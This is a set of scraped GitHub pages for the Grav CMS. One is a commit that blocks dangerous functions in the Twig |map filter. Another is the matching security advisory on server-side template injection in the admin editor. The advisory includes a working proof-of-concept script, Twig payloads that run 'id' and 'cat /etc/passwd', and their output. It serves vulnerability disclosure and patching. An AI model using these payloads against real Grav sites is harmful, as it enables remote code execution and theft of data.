=== Content from github.com_1f29f2f6_20250114_222359.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fcommit%2F9d01140a63c77075ef09b26ef57cf186138151a5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fcommit%2F9d01140a63c77075ef09b26ef57cf186138151a5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=getgrav%2Fgrav)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav](/getgrav/grav)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2Fgetgrav%2Fgrav)
* [Star
   14.7k](/login?return_to=%2Fgetgrav%2Fgrav)

* [Code](/getgrav/grav)
* [Issues
  403](/getgrav/grav/issues)
* [Pull requests
  25](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects
  0](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

Additional navigation options

* [Code](/getgrav/grav)
* [Issues](/getgrav/grav/issues)
* [Pull requests](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

## Commit

[Permalink](/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix for dangerous tags in |map filter

[Browse files](/getgrav/grav/tree/9d01140a63c77075ef09b26ef57cf186138151a5)
Browse the repository at this point in the history

* Loading branch information

[![@rhukster](https://avatars.githubusercontent.com/u/1084697?s=40&v=4)](/rhukster)

[rhukster](/getgrav/grav/commits?author=rhukster "View all commits by rhukster")
committed
Jun 13, 2023

1 parent
[259e775](/getgrav/grav/commit/259e775db84b690dc43f0fa981dbdfc822c9d8bc)

commit 9d01140

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**19 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* CHANGELOG.md
  [CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed)
* system/src/Grav/Common/Twig/Extension

  + system/src/Grav/Common/Twig/Extension/GravExtension.php
    [GravExtension.php](#diff-a85d37d04dd05856c061a673dcedb849de79194bb315500bd681fb001484d644)

## There are no files selected for viewing

2 changes: 2 additions & 0 deletions

2
[CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed "CHANGELOG.md")

Show comments

[View file](/getgrav/grav/blob/9d01140a63c77075ef09b26ef57cf186138151a5/CHANGELOG.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -3,6 +3,8 @@ |
|  |  |  |
|  |  | 1. [](#new) |
|  |  | \* Added a new `system.languages.debug` option that adds a `<span class="translate-debug"></span>` around strings translated with `|t`. This can be styled by the theme as needed. |
|  |  | 1. [](#bugfix) |
|  |  | \* \* Fixed Twig `|map()` allowing code execution |
|  |  |  |
|  |  | # v1.7.41.2 |
|  |  | ## 06/01/2023 |
| Expand Down | |  |

17 changes: 17 additions & 0 deletions

17
[system/src/Grav/Common/Twig/Extension/GravExtension.php](#diff-a85d37d04dd05856c061a673dcedb849de79194bb315500bd681fb001484d644 "system/src/Grav/Common/Twig/Extension/GravExtension.php")

Show comments

[View file](/getgrav/grav/blob/9d01140a63c77075ef09b26ef57cf186138151a5/system/src/Grav/Common/Twig/Extension/GravExtension.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -173,6 +173,7 @@ public function getFilters(): array |
|  |  |  |
|  |  | // Security fix |
|  |  | new TwigFilter('filter', [$this, 'filterFilter'], ['needs\_environment' => true]), |
|  |  | new TwigFilter('map', [$this, 'mapFilter'], ['needs\_environment' => true]), |
|  |  | ]; |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -1713,4 +1714,20 @@ function filterFilter(Environment $env, $array, $arrow) |
|  |  |  |
|  |  | return twig\_array\_filter($env, $array, $arrow); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @param Environment $env |
|  |  | \* @param array $array |
|  |  | \* @param callable|string $arrow |
|  |  | \* @return array|CallbackFilterIterator |
|  |  | \* @throws RuntimeError |
|  |  | \*/ |
|  |  | function mapFilter(Environment $env, $array, $arrow) |
|  |  | { |
|  |  | if (is\_string($arrow) && Utils::isDangerousFunction($arrow)) { |
|  |  | throw new RuntimeError('Twig |map("' . $arrow . '") is not allowed.'); |
|  |  | } |
|  |  |  |
|  |  | return twig\_array\_map($env, $array, $arrow); |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `9d01140`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fcommit%2F9d01140a63c77075ef09b26ef57cf186138151a5) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6f7d365d_20250114_222402.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fsecurity%2Fadvisories%2FGHSA-f9jf-4cp4-4fq5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fsecurity%2Fadvisories%2FGHSA-f9jf-4cp4-4fq5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=getgrav%2Fgrav)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav](/getgrav/grav)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2Fgetgrav%2Fgrav)
* [Star
   14.7k](/login?return_to=%2Fgetgrav%2Fgrav)

* [Code](/getgrav/grav)
* [Issues
  403](/getgrav/grav/issues)
* [Pull requests
  25](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects
  0](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

Additional navigation options

* [Code](/getgrav/grav)
* [Issues](/getgrav/grav/issues)
* [Pull requests](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

# Server Side Template Injection (SSTI)

Critical

[rhukster](/rhukster)
published
GHSA-f9jf-4cp4-4fq5
Jun 14, 2023

## Package

composer

getgrav/grav
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

1.7.41.1

## Patched versions

None

## Description

### Summary

I found an RCE(Remote Code Execution) by SSTI in the admin screen.

### Details

Remote Code Execution is possible by embedding malicious PHP code on the administrator screen by a user with page editing privileges.

### PoC

1. Log in to the administrator screen and access the edit screen of the default page "Typography". (`http://127.0.0.1:8000/admin/pages/typography`)
2. Open the browser's console screen and execute the following JavaScript code to confirm that an arbitrary command (`id`) is being executed.

```
(async () => {
  const nonce = document.querySelector("input[name=admin-nonce]").value;
  const id = document.querySelector("input[name=__unique_form_id__]").value;

  const payload = "{{['id']|map('system')|join}}"; // SSTI Payload

  const params = new URLSearchParams();
  params.append("task", "save");
  params.append("data[header][title]", "poc");
  params.append("data[content]", payload);
  params.append("data[folder]", "poc");
  params.append("data[route]", "");
  params.append("data[name]", "default");
  params.append("data[header][body_classes]", "");
  params.append("data[ordering]", 1);
  params.append("data[order]", "");
  params.append("toggleable_data[header][process]", "on");
  params.append("data[header][process][twig]", 1);
  params.append("data[header][order_by]", "");
  params.append("data[header][order_manual]", "");
  params.append("data[blueprint", "");
  params.append("data[lang]", "");
  params.append("_post_entries_save", "edit");
  params.append("__form-name__", "flex-pages");
  params.append("__unique_form_id__", id);
  params.append("admin-nonce", nonce);

  await fetch("http://127.0.0.1:8000/admin/pages/typography", {
    method: "POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: params,
  });

  window.open("http://127.0.0.1:8000/admin/pages/poc/:preview");
})();
```
#### Execution Result

* Payload: `{{['id']|map('system')|join}}`

```
uid=501(<user_name>) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae) uid=501(<user_name>) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
```

* Payload: `{{['cat /etc/passwd']|map('system')|join}}`

```
## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh daemon:*:1:1:System Services:/var/root:/usr/bin/false _uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico _taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false _networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false _installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false _lp:*:26:26:Printing Services:/var/spool/cups:/usr/bin/false _postfix:*:27:27:Postfix Mail Server:/var/spool/postfix:/usr/bin/false _scsd:*:31:31:Service Configuration Service:/var/empty:/usr/bin/false _ces:*:32:32:Certificate Enrollment Service:/var/empty:/usr/bin/false _appstore:*:33:33:Mac App Store Service:/var/db/appstore:/usr/bin/false _mcxalr:*:54:54:MCX AppLaunch:/var/empty:/usr/bin/false _appleevents:*:55:55:AppleEvents Daemon:/var/empty:/usr/bin/false _geod:*:56:56:Geo Services Daemon:/var/db/geod:/usr/bin/false _devdocs:*:59:59:Developer Documentation:/var/empty:/usr/bin/false _sandbox:*:60:60:Seatbelt:/var/empty:/usr/bin/false _mdnsresponder:*:65:65:mDNSResponder:/var/empty:/usr/bin/false _ard:*:67:67:Apple Remote Desktop:/var/empty:/usr/bin/false _www:*:70:70:World Wide Web Server:/Library/WebServer:/usr/bin/false _eppc:*:71:71:Apple Events User:/var/empty:/usr/bin/false _cvs:*:72:72:CVS Server:/var/empty:/usr/bin/false _svn:*:73:73:SVN Server:/var/empty:/usr/bin/false _mysql:*:74:74:MySQL Server:/var/empty:/usr/bin/false _sshd:*:75:75:sshd Privilege separation:/var/empty:/usr/bin/false _qtss:*:76:76:QuickTime Streaming Server:/var/empty:/usr/bin/false _cyrus:*:77:6:Cyrus Administrator:/var/imap:/usr/bin/false _mailman:*:78:78:Mailman List Server:/var/empty:/usr/bin/false _appserver:*:79:79:Application Server:/var/empty:/usr/bin/false _clamav:*:82:82:ClamAV Daemon:/var/virusmails:/usr/bin/false _amavisd:*:83:83:AMaViS Daemon:/var/virusmails:/usr/bin/false _jabber:*:84:84:Jabber XMPP Server:/var/empty:/usr/bin/false _appowner:*:87:87:Application Owner:/var/empty:/usr/bin/false _windowserver:*:88:88:WindowServer:/var/empty:/usr/bin/false _spotlight:*:89:89:Spotlight:/var/empty:/usr/bin/false _tokend:*:91:91:Token Daemon:/var/empty:/usr/bin/false _securityagent:*:92:92:SecurityAgent:/var/db/securityagent:/usr/bin/false _calendar:*:93:93:Calendar:/var/empty:/usr/bin/false _teamsserver:*:94:94:TeamsServer:/var/teamsserver:/usr/bin/false _update_sharing:*:95:-2:Update Sharing:/var/empty:/usr/bin/false _installer:*:96:-2:Installer:/var/empty:/usr/bin/false _atsserver:*:97:97:ATS Server:/var/empty:/usr/bin/false _ftp:*:98:-2:FTP Daemon:/var/empty:/usr/bin/false _unknown:*:99:99:Unknown User:/var/empty:/usr/bin/false _softwareupdate:*:200:200:Software Update Service:/var/db/softwareupdate:/usr/bin/false _coreaudiod:*:202:202:Core Audio Daemon:/var/empty:/usr/bin/false _screensaver:*:203:203:Screensaver:/var/empty:/usr/bin/false _locationd:*:205:205:Location Daemon:/var/db/locationd:/usr/bin/false _trustevaluationagent:*:208:208:Trust Evaluation Agent:/var/empty:/usr/bin/false _timezone:*:210:210:AutoTimeZoneDaemon:/var/empty:/usr/bin/false _lda:*:211:211:Local Delivery Agent:/var/empty:/usr/bin/false _cvmsroot:*:212:212:CVMS Root:/var/empty:/usr/bin/false _usbmuxd:*:213:213:iPhone OS Device Helper:/var/db/lockdown:/usr/bin/false _dovecot:*:214:6:Dovecot Administrator:/var/empty:/usr/bin/false _dpaudio:*:215:215:DP Audio:/var/empty:/usr/bin/false _postgres:*:216:216:PostgreSQL Server:/var/empty:/usr/bin/false _krbtgt:*:217:-2:Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false _kadmin_admin:*:218:-2:Kerberos Admin Service:/var/empty:/usr/bin/false _kadmin_changepw:*:219:-2:Kerberos Change Password Service:/var/empty:/usr/bin/false _devicemgr:*:220:220:Device Management Server:/var/empty:/usr/bin/false _webauthserver:*:221:221:Web Auth Server:/var/empty:/usr/bin/false _netbios:*:222:222:NetBIOS:/var/empty:/usr/bin/false _warmd:*:224:224:Warm Daemon:/var/empty:/usr/bin/false _dovenull:*:227:227:Dovecot Authentication:/var/empty:/usr/bin/false _netstatistics:*:228:228:Network Statistics Daemon:/var/empty:/usr/bin/false _avbdeviced:*:229:-2:Ethernet AVB Device Daemon:/var/empty:/usr/bin/false _krb_krbtgt:*:230:-2:Open Directory Kerberos Ticket Granting Ticket:/var/empty:/usr/bin/false _krb_kadmin:*:231:-2:Open Directory Kerberos Admin Service:/var/empty:/usr/bin/false _krb_changepw:*:232:-2:Open Directory Kerberos Change Password Service:/var/empty:/usr/bin/false _krb_kerberos:*:233:-2:Open Directory Kerberos:/var/empty:/usr/bin/false _krb_anonymous:*:234:-2:Open Directory Kerberos Anonymous:/var/empty:/usr/bin/false _assetcache:*:235:235:Asset Cache Service:/var/empty:/usr/bin/false _coremediaiod:*:236:236:Core Media IO Daemon:/var/empty:/usr/bin/false _launchservicesd:*:239:239:_launchservicesd:/var/empty:/usr/bin/false _iconservices:*:240:240:IconServices:/var/empty:/usr/bin/false _distnote:*:241:241:DistNote:/var/empty:/usr/bin/false _nsurlsessiond:*:242:242:NSURLSession Daemon:/var/db/nsurlsessiond:/usr/bin/false _displaypolicyd:*:244:244:Display Policy Daemon:/var/empty:/usr/bin/false _astris:*:245:245:Astris Services:/var/db/astris:/usr/bin/false _krbfast:*:246:-2:Kerberos FAST Account:/var/empty:/usr/bin/false _gamecontrollerd:*:247:247:Game Controller Daemon:/var/empty:/usr/bin/false _mbsetupuser:*:248:248:Setup User:/var/setup:/bin/bash _ondemand:*:249:249:On Demand Resource Daemon:/var/db/ondemand:/usr/bin/false _xserverdocs:*:251:251:macOS Server Documents Service:/var/empty:/usr/bin/false _wwwproxy:*:252:252:WWW Proxy:/var/empty:/usr/bin/false _mobileasset:*:253:253:MobileAsset User:/var/ma:/usr/bin/false _findmydevice:*:254:254:Find My Device Daemon:/var/db/findmydevice:/usr/bin/false _datadetectors:*:257:257:DataDetectors:/var/db/datadetectors:/usr/bin/false _captiveagent:*:258:258:captiveagent:/var/empty:/usr/bin/false _ctkd:*:259:259:ctkd Account:/var/empty:/usr/bin/false _applepay:*:260:260:applepay Account:/var/db/applepay:/usr/bin/false _hidd:*:261:261:HID Service User:/var/db/hidd:/usr/bin/false _cmiodalassistants:*:262:262:CoreMedia IO Assistants User:/var/db/cmiodalassistants:/usr/bin/false _analyticsd:*:263:263:Analytics Daemon:/var/db/analyticsd:/usr/bin/false _fpsd:*:265:265:FPS Daemon:/var/db/fpsd:/usr/bin/false _timed:*:266:266:Time Sync Daemon:/var/db/timed:/usr/bin/false _nearbyd:*:268:268:Proximity and Ranging Daemon:/var/db/nearbyd:/usr/bin/false _reportmemoryexception:*:269:269:ReportMemoryException:/var/db/reportmemoryexception:/usr/bin/false _driverkit:*:270:270:DriverKit:/var/empty:/usr/bin/false _diskimagesiod:*:271:271:DiskImages IO Daemon:/var/db/diskimagesiod:/usr/bin/false _logd:*:272:272:Log Daemon:/var/db/diagnostics:/usr/bin/false _appinstalld:*:273:273:App Install Daemon:/var/db/appinstalld:/usr/bin/false _installcoordinationd:*:274:274:Install Coordination Daemon:/var/db/installcoordinationd:/usr/bin/false _demod:*:275:275:Demo Daemon:/var/empty:/usr/bin/false _rmd:*:277:277:Remote Management Daemon:/var/db/rmd:/usr/bin/false _accessoryupdater:*:278:278:Accessory Update Daemon:/var/db/accessoryupdater:/usr/bin/false _knowledgegraphd:*:279:279:Knowledge Graph Daemon:/var/db/knowledgegraphd:/usr/bin/false _coreml:*:280:280:CoreML Services:/var/db/coreml:/usr/bin/false _sntpd:*:281:281:SNTP Server Daemon:/var/empty:/usr/bin/false _trustd:*:282:282:trustd:/var/empty:/usr/bin/false _mmaintenanced:*:283:283:mmaintenanced:/var/db/mmaintenanced:/usr/bin/false _darwindaemon:*:284:284:Darwin Daemon:/var/db/darwindaemon:/usr/bin/false _notification_proxy:*:285:285:Notification Proxy:/var/empty:/usr/bin/false _avphidbridge:*:288:288:Apple Virtual Platform HID Bridge:/var/empty:/usr/bin/false _biome:*:289:289:Biome:/var/db/biome:/usr/bin/false _backgroundassets:*:291:291:Background Assets Service:/var/empty:/usr/bin/false _oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false _oahd:*:441:441:OAH Daemon:/var/empty:/usr/bin/false
```
#### PoC Video

* [PoC Video](https://drive.google.com/file/d/1wsmv7abdGc8WdYLNPPC5GrFcybhCORf2/view?usp=sharing)

### Impact

Remote Command Execution (RCE) is possible.

### Occurrences

* <https://github.com/getgrav/grav/blob/develop/system/src/Grav/Common/Twig/Extension/GravExtension.php#L174>

### References

* [PortSwigger: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
* [HackTricks: SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php)

### Severity

Critical

9.1

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2023-34251

### Weaknesses

[CWE-94](/advisories?query=cwe%3A94)

### Credits

* [![@scgajge12](https://avatars.githubusercontent.com/u/47602064?s=40&v=4)](/scgajge12)
  [scgajge12](/scgajge12)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ae8961e0_20250114_222355.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fblob%2Fdevelop%2Fsystem%2Fsrc%2FGrav%2FCommon%2FTwig%2FExtension%2FGravExtension.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

